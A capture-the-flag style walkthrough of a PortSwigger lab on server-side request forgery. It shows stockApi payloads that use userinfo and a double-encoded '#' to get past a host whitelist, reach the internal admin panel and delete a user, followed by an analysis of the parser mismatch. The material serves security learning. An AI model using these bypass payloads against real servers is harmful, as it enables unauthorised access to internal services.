# [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

> whitelisted `stockApi` requests

- send a product stock request
- send it tot the repeater

```
POST /product/stock HTTP/2
...
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

- the request makes another "internal" request
- change the `stockApi` to

```
stockApi=http://localhost/admin
```

- send the request
- it will respond with

```
HTTP/2 400 Bad Request
...
"External stock check host must be stock.weliketoshop.net"
```

- the server blocks the `localhost/admin` because of existing whitelist

> change the `localhost/admin` to pass whitelist

**note: workaround explanation [here](?file=portswigger/basic/ssrf)**

- change the `stockApi` to

```
stockApi=http://stock.weliketoshop.net
```

- the response

```
HTTP/2 500 Internal Server Error
...
<p class=is-warning>Could not connect to external stock check service</p>
...
```

- this time it was not filtered but the server could not parse the request (probably)
- lets try to add userinfo to the url

```
stockApi=http://localhost@stock.weliketoshop.net
```

- same response
- lets try to add a fragment delimiter `#`

```
stockApi=http://localhost#@stock.weliketoshop.net
```

- changed the response to

```
HTTP/2 400 Bad Request

"External stock check host must be stock.weliketoshop.net"
```

- there is probably a validator that lets trough the requests with 500 responses, but not the 400 responses
- the `#` chops off the rest of the url so the validator only sees the `localhost`

> trick the validator

- `url encode` the `#` once

```
stockApi=http://localhost%23@stock.weliketoshop.net
```

- not allowed 400
- `url encode` the `#` again

```
stockApi=http://localhost%2523@stock.weliketoshop.net
```

- it will return the admin logged in home page

> solving the lab

- look up the admin page in the response html
- send the request again with the admin path

```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

- in the response there is the delete page
- look up the `carlos` delete path
- send the request with the `carlos` delete path added

```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

## what is going on (best-supported model)

> The string is parsed by two independent components that disagree about the host:

- a **validator** (checks the host against the whitelist)
- an **HTTP requester** (makes the outbound request)

> They are not a pipeline handing fields to each other — they each parse the same string on their own. The exploit lives in the gap between them.

### starting point

> The framework URL-decodes the body **once**, so both components begin with:

`http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos`

### validator

- does **not** decode `%23`, it stays as literal characters -> **not a delimiter**
- authority reads as `localhost%23@stock.weliketoshop.net`
- the `@` then splits userinfo (`localhost%23`) from host
- extracted host = `stock.weliketoshop.net` -> **passes the whitelist.**
- the path and query is `/admin/delete?username=carlos`

### HTTP requester

- decodes the string **one more time**, turning `%23` into `#`
- `#` terminates the authority, so host = `localhost`
- it connects to **localhost**

### the exploit

> the HTTP requester connects to the host and the validator supplies the path and query
